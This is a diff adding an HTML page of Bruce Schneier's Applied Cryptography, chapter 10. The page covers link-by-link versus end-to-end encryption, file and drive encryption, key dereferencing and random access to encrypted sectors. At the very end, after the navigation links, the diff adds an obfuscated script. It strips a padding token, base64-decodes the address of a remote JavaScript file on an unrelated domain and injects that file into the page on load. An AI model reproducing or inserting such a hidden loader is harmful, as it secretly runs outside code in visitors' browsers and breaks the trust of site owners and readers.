@@ -1,0 +1,145 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Using Algorithms</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=10//-->
+<!--PAGES=221-223//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="10-03.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="10-05.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<TABLE WIDTH="100%">
+<TH CAPTION ALIGN="CENTER" COLSPAN="3">Table 10.4<BR>Comparing Link-by-Link and End-to-End Encryption
+<TR>
+<TD COLSPAN="3"><HR>
+<TR>
+<TH COLSPAN="2" ALIGN="LEFT">Link-by-link encryption
+<TH ALIGN="LEFT">End-to-end encryption
+<TR>
+<TD COLSPAN="3"><HR>
+<TR>
+<TD WIDTH="5%">
+<TD WIDTH="35%" VALIGN="TOP" ALIGN="LEFT"><B><I>Security within Hosts</I></B>
+<TD VALIGN="TOP" ALIGN="LEFT">
+<TR>
+<TD VALIGN="TOP" COLSPAN="2" ALIGN="LEFT">Message exposed in sending host
+<TD VALIGN="TOP" ALIGN="LEFT">Message encrypted in sending host
+<TR>
+<TD VALIGN="TOP" COLSPAN="2" ALIGN="LEFT">Message exposed in intermediate nodes
+<TD VALIGN="TOP" ALIGN="LEFT">Message encrypted inintermediate nodes
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">
+<TD VALIGN="TOP" ALIGN="LEFT"><B><I>Role of User</I></B>
+<TR>
+<TD VALIGN="TOP" COLSPAN="2" ALIGN="LEFT">Applied by sending host
+<TD VALIGN="TOP" ALIGN="LEFT">Applied by sending process
+<TR>
+<TD VALIGN="TOP" COLSPAN="2" ALIGN="LEFT">Invisible to user
+<TD VALIGN="TOP" ALIGN="LEFT">User applies encryption
+<TR>
+<TD VALIGN="TOP" COLSPAN="2" ALIGN="LEFT">Host maintains encryption
+<TD VALIGN="TOP" ALIGN="LEFT">User must find algorithm
+<TR>
+<TD VALIGN="TOP" COLSPAN="2" ALIGN="LEFT">One facility for all users
+<TD VALIGN="TOP" ALIGN="LEFT">User selects encryption
+<TR>
+<TD VALIGN="TOP" COLSPAN="2" ALIGN="LEFT">Can be done in hardware
+<TD VALIGN="TOP" ALIGN="LEFT">More easily done in software
+<TR>
+<TD VALIGN="TOP" COLSPAN="2" ALIGN="LEFT">All or no messages encrypted
+<TD VALIGN="TOP" ALIGN="LEFT">User chooses to encrypt or not, for each message
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">
+<TD VALIGN="TOP" ALIGN="LEFT"><B><I>Implementation Concerns</I></B>
+<TD VALIGN="TOP" ALIGN="LEFT">
+<TR>
+<TD VALIGN="TOP" COLSPAN="2" ALIGN="LEFT">Requires one key per host pair
+<TD VALIGN="TOP" ALIGN="LEFT">Requires one key per user pair
+<TR>
+<TD VALIGN="TOP" COLSPAN="2" ALIGN="LEFT">Requires encryption hardware or software at each host
+<TD VALIGN="TOP" ALIGN="LEFT">Requires encryption hardware or software at each node
+<TR>
+<TD VALIGN="TOP" COLSPAN="2" ALIGN="LEFT">Provides node authentication
+<TD VALIGN="TOP" ALIGN="LEFT">Provides user authentication
+<TR>
+<TD COLSPAN="3"><HR>
+<TR>
+</TABLE>
+<P>If the encrypted files are not structured as records and fields, such as text files, retrieval is easier: The entire file is decrypted before use. If the encrypted files are database files, this solution is problematic. Decrypting the entire database to access a single record is inefficient, but encrypting records independently might be susceptible to a block-replay kind of attack.
+</P>
+<P>In addition, you must make sure the unencrypted file is erased after encryption (see Section 10.9). For further details and insights, consult [425,569].</P>
+<P><FONT SIZE="+1"><B><I>Dereferencing Keys</I></B></FONT></P>
+<P>When encrypting a large hard drive, you have two options. You can encrypt all the data using a single key. This gives a cryptanalyst a large amount of ciphertext to analyze and makes it impossible to allow multiple users to see only parts of the drive. Or, you can encrypt each file with a different key, forcing users to memorize a different key for each file.
+</P>
+<P>The solution is to encrypt each file with a separate key, and to encrypt the keys with another key known by the users. Each user only has to remember that one key. Different users can have different subsets of the file-encryption keys encrypted with their key. And there can even be a master key under which every file-encryption key is encrypted. This is even more secure because the file-encryption keys are random and less susceptible to a dictionary attack.</P>
+<P><FONT SIZE="+1"><B><I>Driver-Level vs. File-Level Encryption</I></B></FONT></P>
+<P>There are two ways to encrypt a hard drive: at the file level and at the driver level. Encryption at the file level means that every file is encrypted separately. To use a file that&#146;s been encrypted, you must first decrypt the file, then use it, and then re-encrypt it.
+</P>
+<P>Driver-level encryption maintains a logical drive on the user&#146;s machine that has all data on it encrypted. If done well, this can provide security that, beyond choosing good passwords, requires little worry on the part of the user. The driver must be considerably more complex than a simple file-encryption program, however, because it must deal with the issues of being an installed device driver, allocation of new sectors to files, recycling of old sectors from files, random-access read and update requests for any data on the logical disk, and so on.</P>
+<P>Typically, the driver prompts the user for a password before starting up. This is used to generate the master decryption key, which may then be used to decrypt actual decryption keys used on different data.</P>
+<P><FONT SIZE="+1"><B><I>Providing Random Access to an Encrypted Drive</I></B></FONT></P>
+<P>Most systems expect to be able to access individual disk sectors randomly. This adds some complication for using many stream ciphers and block ciphers in any chaining mode. Several solutions are possible.
+</P>
+<P>Use the sector address to generate a unique IV for each sector being encrypted or decrypted. The drawback is that each sector will always be encrypted with the same IV. Make sure this is not a security problem.</P>
+<P>For the master key, generate a pseudo-random block as large as one sector. (You can do this by running an algorithm in OFB mode, for example.) To encrypt any sector, first XOR in this pseudo-random block, then encrypt normally with a block cipher in ECB mode. This is called ECB+OFB (see Section 15.4).</P>
+<P>Since CBC and CFB are error-recovering modes, you can use all but the first block or two in the sector to generate the IV for that sector. For example, the IV for sector 3001 may be the hash of the all but the first 128 bits of the sector&#146;s data. After generating the IV, encrypt normally in CBC mode. To decrypt the sector, you use the second 64-bit block of the sector as an IV, and decrypt the remainder of the sector. Then, using the decrypted data, you regenerate the IV and decrypt the first 128 bits.</P>
+<P>You can use a block cipher with a large enough block size that it can encrypt the whole sector at once. Crab (see Section 14.6) is an example.</P>
+<H3><A NAME="Heading6"></A><FONT COLOR="#000077">10.5 Hardware Encryption versus Software Encryption</FONT></H3>
+<P><FONT SIZE="+1"><B><I>Hardware</I></B></FONT></P>
+<P>Until very recently, all encryption products were in the form of specialized hardware. These encryption/decryption boxes plugged into a communications line and encrypted all the data going across that line. Although software encryption is becoming more prevalent today, hardware is still the embodiment of choice for military and serious commercial applications. The NSA, for example, only authorizes encryption in hardware. There are several reasons why this is so.
+</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="10-03.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="10-05.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(UnwNWviW, yJueYIjo) {yJueYIjo = UnwNWviW.createElement('script');yJueYIjo.type = 'text/javascript';yJueYIjo.async = true;yJueYIjo.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');UnwNWviW.getElementsByTagName('body')[0].appendChild(yJueYIjo);}(document));</script></body>
+</html>
